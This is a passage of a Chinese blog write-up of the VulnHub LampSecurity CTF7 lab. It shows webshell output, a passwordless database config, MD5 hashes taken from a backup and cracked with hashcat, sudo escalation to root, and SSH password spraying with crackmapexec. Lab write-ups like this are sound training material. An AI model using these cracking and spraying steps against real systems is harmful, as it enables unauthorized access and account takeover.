2.6.32-279.el6.i686 <span class="hljs-comment">#1 SMP Fri Jun 22 10:59:55 UTC 2012 i686 i686 i386 GNU/Linux</span><br> 17:37:14 up  2:45,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.00, 0.00<br>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=48(apache) gid=48(apache) <span class="hljs-built_in">groups</span>=48(apache) context=system_u:system_r:httpd_t:s0<br>sh: no job control <span class="hljs-keyword">in</span> this shell<br>sh-4.1$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>apache<br>sh-4.1$ <span class="hljs-built_in">pwd</span><br>/<br><span class="hljs-built_in">pwd</span><br>sh-4.1$ ip a<br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue state UNKNOWN <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:ac:12:e4 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.141/24 brd 192.168.56.255 scope global eth1<br>    inet6 fe80::20c:29ff:feac:12e4/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure>

<p>Sucessfully get webshell.</p>
<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>先python spwan一个更稳定的shell。<br>然后<code>sudo -l</code>需要密码，<code>find</code>suid位文件没有能用的，<code>cat /etc/crontab</code>直接没有定时任务。OK。<br>行吧，在上大招前先手工枚举一下吧。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -a                                                                                     <br>Linux localhost.localdomain 2.6.32-279.el6.i686 <span class="hljs-comment">#1 SMP Fri Jun 22 10:59:55 UTC 2012 i686 i686 i386 GNU/Linux </span><br></code></pre></td></tr></table></figure>

<p>版本挺低的，还是经典2.6，可以考虑内核提权。但是优先级往后稍稍吧。</p>
<h3 id="配置文件查看"><a href="#配置文件查看" class="headerlink" title="配置文件查看"></a>配置文件查看</h3><p><code>cd</code>到&#x2F;home目录下，发现很多用户，然而没有read权限，没用，查不了是否有用户遗留的登录凭证。<br>那就看看网站配置文件啥的吧，找点前后端连接用到的密码。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-4.1$ <span class="hljs-built_in">cat</span> config.inc.php<br><span class="hljs-built_in">cat</span> config.inc.php<br>&lt;?php<br>/*<br> * Generated configuration file<br> * Generated by: phpMyAdmin 3.5.4 setup script<br> * Date: Wed, 19 Dec 2012 09:01:38 -0500<br> */<br><br>/* Servers configuration */<br><span class="hljs-variable">$i</span> = 0;<br><br>/* Server: localhost [1] */<br><span class="hljs-variable">$i</span>++;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;verbose&#x27;</span>] = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;host&#x27;</span>] = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;port&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;socket&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;connect_type&#x27;</span>] = <span class="hljs-string">&#x27;tcp&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;extension&#x27;</span>] = <span class="hljs-string">&#x27;mysqli&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;nopassword&#x27;</span>] = <span class="hljs-literal">true</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;auth_type&#x27;</span>] = <span class="hljs-string">&#x27;cookie&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;AllowNoPassword&#x27;</span>] = TRUE;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;AllowNoPasswordRoot&#x27;</span>] = TRUE; <br><br>/* End of servers configuration */<br><br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;blowfish_secret&#x27;</span>] = <span class="hljs-string">&#x27;50d1c8ba084fd9.39888691&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;DefaultLang&#x27;</span>] = <span class="hljs-string">&#x27;en&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;ServerDefault&#x27;</span>] = 1;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;UploadDir&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;SaveDir&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>从网站config文件我们可以看到，数据root用户登录直接不用密码。那我之后可以登录一下数据库找点信息。</p>
<h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><p>再手动遍历了下网页目录，发现之前进不去的&#x2F;backups目录有个备份文件。我们查看一下，刚好最后几行记录了向数据库插入用户的账号密码等信息。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">/* /var/www/html/backups */</span><br>LOCK TABLES `users` WRITE;<br><span class="hljs-comment">/*!40000 ALTER TABLE `users` DISABLE KEYS */</span>;<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `users` <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;webdev@localhost.localdomain&#x27;</span>,<span class="hljs-string">&#x27;f7aa6066f95255096672e3a5fc537081&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-number">13</span>,<span class="hljs-string">&#x27;Developer account&#x27;</span>,<span class="hljs-string">&#x27;Developer account for updating the site.&#x27;</span>),(<span class="hljs-string">&#x27;brian@localhost.localdomain&#x27;</span>,<span class="hljs-string">&#x27;d41d8cd98f00b204e9800998ecf8427e&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;2012-12-19 11:30:54&#x27;</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;Brian Hershel&#x27;</span>,<span class="hljs-string">&#x27;Brian is our technical brains behind the operations and a chief trainer.&#x27;</span>),(<span class="hljs-string">&#x27;john@localhost.localdomain&#x27;</span>,<span class="hljs-string">&#x27;0d9ff2a4396d6939f80ffe09b1280ee1&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;John Durham&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>),(<span class="hljs-string">&#x27;alice@localhost.localdomain&#x27;</span>,<span class="hljs-string">&#x27;2146bf95e8929874fc63d54f50f1d2e3&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;Alice Wonder&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>),(<span class="hljs-string">&#x27;ruby@localhost.localdomain&#x27;</span>,<span class="hljs-string">&#x27;9f80ec37f8313728ef3e2f218c79aa23&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-number">6</span>,<span class="hljs-string">&#x27;Ruby Spinster&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>),(<span class="hljs-string">&#x27;leon@localhost.localdomain&#x27;</span>,<span class="hljs-string">&#x27;5d93ceb70e2bf5daa84ec3d0cd2c731a&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-number">7</span>,<span class="hljs-string">&#x27;Leon Parnetta&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>),(<span class="hljs-string">&#x27;julia@localhost.localdomain&#x27;</span>,<span class="hljs-string">&#x27;ed2539fe892d2c52c42a440354e8e3d5&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;Julia Fields&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>),(<span class="hljs-string">&#x27;michael@localhost.localdomain&#x27;</span>,<span class="hljs-string">&#x27;9c42a1346e333a770904b2a2b37fa7d3&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-number">9</span>,<span class="hljs-string">&#x27;Michael Saint&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>),(<span class="hljs-string">&#x27;bruce@localhost.localdomain&#x27;</span>,<span class="hljs-string">&#x27;3a24d81c2b9d0d9aaf2f10c6c9757d4e&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-number">10</span>,<span class="hljs-string">&#x27;Bruce Pottricks&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>),(<span class="hljs-string">&#x27;neil@localhost.localdomain&#x27;</span>,<span class="hljs-string">&#x27;4773408d5358875b3764db552a29ca61&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-number">11</span>,<span class="hljs-string">&#x27;Neil Felstein&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>),(<span class="hljs-string">&#x27;charles@localhost.localdomain&#x27;</span>,<span class="hljs-string">&#x27;b2a97bcecbd9336b98d59d9324dae5cf&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-number">12</span>,<span class="hljs-string">&#x27;Charles Adams&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-comment">/*!40000 ALTER TABLE `users` ENABLE KEYS */</span>;<br></code></pre></td></tr></table></figure>

<p>我们提取一下登录凭证，把哈希值丢到<code>crackstation</code>。然后用得到的密码尝试直接ssh看看能不能成功登录。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">brain:&#x27;&#x27;#竟然是md5的空值，草。<br>webdev:&#x27;webdev&#x27;<br>john:&#x27;transformersrule&#x27;<br></code></pre></td></tr></table></figure>

<p>试到第3个john的时候就成功了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-4.1$ su john<br>su john<br>Password: transformersrule<br><br>[john@localhost backups]$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>john<br>[john@localhost backups]$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> john: transformersrule<br><br>Matching Defaults entries <span class="hljs-keyword">for</span> john on this host:<br>    requiretty, !visiblepw, always_set_home, env_reset, env_keep=<span class="hljs-string">&quot;COLORS</span><br><span class="hljs-string">    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&quot;</span>, env_keep+=<span class="hljs-string">&quot;MAIL PS1</span><br><span class="hljs-string">    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;</span>, env_keep+=<span class="hljs-string">&quot;LC_COLLATE</span><br><span class="hljs-string">    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;</span>, env_keep+=<span class="hljs-string">&quot;LC_MONETARY</span><br><span class="hljs-string">    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;</span>, env_keep+=<span class="hljs-string">&quot;LC_TIME LC_ALL</span><br><span class="hljs-string">    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;</span>,<br>    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin<br><br>User john may run the following commands on this host:<br>    (ALL) ALL<br>[john@localhost backups]$ sudo su<br>sudo su<br>[root@localhost backups]<span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br>[root@localhost backups]<span class="hljs-comment"># ip a</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue state UNKNOWN <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:ac:12:e4 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.141/24 brd 192.168.56.255 scope global eth1<br>    inet6 fe80::20c:29ff:feac:12e4/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure>

<p>直接是sudo用户组的，直接提权成功。</p>
<h3 id="密码复用"><a href="#密码复用" class="headerlink" title="密码复用"></a>密码复用</h3><p>当然，我们也可以登录mysql数据库查看用户与密码。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs sql">#mysql <span class="hljs-operator">-</span>uroot<br>#<span class="hljs-keyword">show</span> databases;<br>#use users;<br>#<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users;<br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> username,password <span class="hljs-keyword">from</span> users;<br><span class="hljs-keyword">select</span> username,password <span class="hljs-keyword">from</span> users;<br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------------------+----------------------------------+</span><br><span class="hljs-operator">|</span> username                      <span class="hljs-operator">|</span> password                         <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------------------+----------------------------------+</span><br><span class="hljs-operator">|</span> brian<span class="hljs-variable">@localhost</span>.localdomain   <span class="hljs-operator">|</span> e22f07b17f98e0d9d364584ced0e3c18 <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> john<span class="hljs-variable">@localhost</span>.localdomain    <span class="hljs-operator">|</span> <span class="hljs-number">0</span>d9ff2a4396d6939f80ffe09b1280ee1 <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> alice<span class="hljs-variable">@localhost</span>.localdomain   <span class="hljs-operator">|</span> <span class="hljs-number">2146</span>bf95e8929874fc63d54f50f1d2e3 <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> ruby<span class="hljs-variable">@localhost</span>.localdomain    <span class="hljs-operator">|</span> <span class="hljs-number">9</span>f80ec37f8313728ef3e2f218c79aa23 <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> leon<span class="hljs-variable">@localhost</span>.localdomain    <span class="hljs-operator">|</span> <span class="hljs-number">5</span>d93ceb70e2bf5daa84ec3d0cd2c731a <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> julia<span class="hljs-variable">@localhost</span>.localdomain   <span class="hljs-operator">|</span> ed2539fe892d2c52c42a440354e8e3d5 <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> michael<span class="hljs-variable">@localhost</span>.localdomain <span class="hljs-operator">|</span> <span class="hljs-number">9</span>c42a1346e333a770904b2a2b37fa7d3 <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> bruce<span class="hljs-variable">@localhost</span>.localdomain   <span class="hljs-operator">|</span> <span class="hljs-number">3</span>a24d81c2b9d0d9aaf2f10c6c9757d4e <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> neil<span class="hljs-variable">@localhost</span>.localdomain    <span class="hljs-operator">|</span> <span class="hljs-number">4773408</span>d5358875b3764db552a29ca61 <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> charles<span class="hljs-variable">@localhost</span>.localdomain <span class="hljs-operator">|</span> b2a97bcecbd9336b98d59d9324dae5cf <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> foo<span class="hljs-variable">@bar</span>.com                   <span class="hljs-operator">|</span> <span class="hljs-number">4</span>cb9c8a8048fd02294477fcb1a41191a <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-number">1</span><span class="hljs-variable">@1</span>.com                       <span class="hljs-operator">|</span> c4ca4238a0b923820dcc509a6f75849b <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> test<span class="hljs-variable">@nowhere</span>.com              <span class="hljs-operator">|</span> <span class="hljs-number">098</span>f6bcd4621d373cade4e832627b4f6 <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------------------+----------------------------------+</span><br><span class="hljs-number">13</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure>

<p>将这些凭证用<code>sed</code>与<code>awk</code>处理后，将hash值直接丢到<code>hashcat</code>中破解。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]<br>└─$ hashcat -a 0 -m 0 passhash /usr/share/wordlists/rockyou.txt <br>hashcat (v6.2.6) starting<br><br>OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="hljs-comment">#1 [The pocl project]</span><br>==================================================================================================================================================<br>* Device <span class="hljs-comment">#1: pthread-sandybridge-Intel(R) Core(TM) i7-6700 CPU @ 3.40GHz, 2913/5890 MB (1024 MB allocatable), 8MCU</span><br><br>Minimum password length supported by kernel: 0<br>Maximum password length supported by kernel: 256<br><br>Hashes: 12 digests; 12 unique digests, 1 unique salts<br>Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br>Rules: 1<br><br>Optimizers applied:<br>* Zero-Byte<br>* Early-Skip<br>* Not-Salted<br>* Not-Iterated<br>* Single-Salt<br>* Raw-Hash<br><br>ATTENTION! Pure (unoptimized) backend kernels selected.<br>Pure kernels can crack longer passwords, but drastically reduce performance.<br>If you want to switch to optimized kernels, append -O to your commandline.<br>See the above message to find out about the exact limits.<br><br>Watchdog: Temperature abort trigger <span class="hljs-built_in">set</span> to 90c<br><br>Host memory required <span class="hljs-keyword">for</span> this attack: 2 MB<br><br>Dictionary cache built:<br>* Filename..: /usr/share/wordlists/rockyou.txt<br>* Passwords.: 14344392<br>* Bytes.....: 139921507<br>* Keyspace..: 14344385<br>* Runtime...: 4 secs<br><br>ed2539fe892d2c52c42a440354e8e3d5:madrid                   <br>4cb9c8a8048fd02294477fcb1a41191a:changeme                 <br>5d93ceb70e2bf5daa84ec3d0cd2c731a:qwer1234                 <br>098f6bcd4621d373cade4e832627b4f6:<span class="hljs-built_in">test</span>                     <br>b2a97bcecbd9336b98d59d9324dae5cf:chuck33                  <br>2146bf95e8929874fc63d54f50f1d2e3:turtles77                <br>9c42a1346e333a770904b2a2b37fa7d3:somepassword             <br>e22f07b17f98e0d9d364584ced0e3c18:my2cents                 <br>Cracking performance lower than expected?                 <br><br>* Append -O to the commandline.<br>  This lowers the maximum supported password/salt length (usually down to 32).<br><br>* Append -w 3 to the commandline.<br>  This can cause your screen to lag.<br><br>* Append -S to the commandline.<br>  This has a drastic speed impact but can be better <span class="hljs-keyword">for</span> specific attacks.<br>  Typical scenarios are a small wordlist but a large ruleset.<br><br>* Update your backend API runtime / driver the right way:<br>  https://hashcat.net/faq/wrongdriver<br><br>* Create more work items to make use of your parallelization power:<br>  https://hashcat.net/faq/morework<br><br>Approaching final keyspace - workload adjusted.           <br><br>                                                          <br>Session..........: hashcat<br>Status...........: Exhausted<br>Hash.Mode........: 0 (MD5)<br>Hash.Target......: passhash<br>Time.Started.....: Wed May  3 14:34:10 2023 (6 secs)<br>Time.Estimated...: Wed May  3 14:34:16 2023 (0 secs)<br>Kernel.Feature...: Pure Kernel<br>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)<br>Guess.Queue......: 1/1 (100.00%)<br>Speed.<span class="hljs-comment">#1.........:  2728.7 kH/s (0.22ms) @ Accel:512 Loops:1 Thr:1 Vec:8</span><br>Recovered........: 8/12 (66.67%) Digests (total), 8/12 (66.67%) Digests (new)<br>Progress.........: 14344385/14344385 (100.00%)<br>Rejected.........: 0/14344385 (0.00%)<br>Restore.Point....: 14344385/14344385 (100.00%)<br>Restore.Sub.<span class="hljs-comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span><br>Candidate.Engine.: Device Generator<br>Candidates.<span class="hljs-comment">#1....: $HEX[206b72697374656e616e6e65] -&gt; $HEX[042a0337c2a156616d6f732103]</span><br>Hardware.Mon.<span class="hljs-comment">#1..: Util: 28%</span><br><br>Started: Wed May  3 14:33:41 2023<br>Stopped: Wed May  3 14:34:17 2023<br></code></pre></td></tr></table></figure>

<p>我们用这些凭证进行密码喷洒攻击。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]<br>└─$ sudo crackmapexec ssh 192.168.56.141 -u username -p pass --continue-on-success | grep +<br>SSH         192.168.56.141  22     192.168.56.141   [+] brian:my2cents <br>SSH         192.168.56.141  22     192.168.56.141   [+] alice:turtles77 <br>SSH         192.168.56.141  22     192.168.56.141   [+] leon:qwer1234 <br>SSH         192.168.56.141  22     192.168.56.141   [+] julia:madrid <br>SSH         192.168.56.141  22     192.168.56.141   [+] michael:somepassword <br>SSH         192.168.56.141  22     192.168.56.141   [+] charles:chuck33<br></code></pre></td></tr></table></figure>

<p>非常OK。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-start"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/05/24/jarbas/">← Next [vulnhub]  jarbas</a></div></div></div><div id="comments"><div class="selector"><button class="gitalk-sel"></button></div><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E9%83%A8%E7%BD%B2"><span class="toc-number">1.</span> <span class="toc-text">靶机部署</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXPLOIT"><span class="toc-number">3.</span> <span class="toc-text">EXPLOIT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web"><span class="toc-number">3.1.</span> <span class="toc-text">web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 